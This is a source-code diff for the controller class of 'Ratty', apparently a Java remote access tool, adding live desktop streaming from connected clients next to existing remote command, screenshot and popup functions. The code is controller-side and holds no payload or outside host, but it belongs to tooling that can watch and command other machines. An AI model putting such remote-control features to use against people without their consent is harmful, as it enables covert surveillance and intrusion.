@@ -6,6 +6,7 @@ import java.util.ArrayList;
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.packet.CommandPacket;
+import de.sogomn.rat.packet.DesktopStreamPacket;
 import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
@@ -13,8 +14,11 @@ import de.sogomn.rat.packet.PopupPacket;
 import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
+import de.sogomn.rat.util.FrameEncoder.IFrame;
 
 public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
+	
+	private boolean streamingDesktop;
 	
 	private RattyGui gui;
 	
@@ -49,14 +53,14 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		return null;
 	}
 	
-	private IPacket getPacket(final String actionCommand) {
-		if (actionCommand == RattyGui.POPUP) {
+	private IPacket getPacket(final String command) {
+		if (command == RattyGui.POPUP) {
 			return PopupPacket.create();
-		} else if (actionCommand == RattyGui.FREE) {
+		} else if (command == RattyGui.FREE) {
 			return new FreePacket();
-		} else if (actionCommand == RattyGui.SCREENSHOT) {
+		} else if (command == RattyGui.SCREENSHOT) {
 			return new ScreenshotPacket();
-		} else if (actionCommand == RattyGui.COMMAND) {
+		} else if (command == RattyGui.COMMAND) {
 			return CommandPacket.create();
 		}
 		
@@ -79,6 +83,19 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final BufferedImage image = screenshot.getImage();
 			
 			gui.showImage(image);
+		} else if (packet instanceof DesktopStreamPacket) {
+			final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
+			final IFrame frame = stream.getFrame();
+			final int screenWidth = stream.getScreenWidth();
+			final int screenHeight = stream.getScreenHeight();
+			
+			if (streamingDesktop) {
+				final DesktopStreamPacket request = new DesktopStreamPacket();
+				
+				gui.showFrame(frame, screenWidth, screenHeight);
+				
+				client.addPacket(request);
+			}
 		} else {
 			packet.execute(client);
 		}
@@ -100,13 +117,21 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	@Override
-	public void userInput(final String actionCommand) {
+	public void userInput(final String command) {
 		final long lastIdClicked = gui.getLastIdClicked();
 		final ActiveClient client = getClient(lastIdClicked).client;
-		final IPacket packet = getPacket(actionCommand);
+		final IPacket packet = getPacket(command);
 		
 		if (packet != null) {
 			client.addPacket(packet);
+		} else if (command == RattyGui.DESKTOP) {
+			final DesktopStreamPacket stream = new DesktopStreamPacket(false);
+			
+			streamingDesktop = true;
+			
+			client.addPacket(stream);
+		} else if (command == RattyGui.DESKTOP_STOP) {
+			streamingDesktop = false;
 		}
 	}
 	
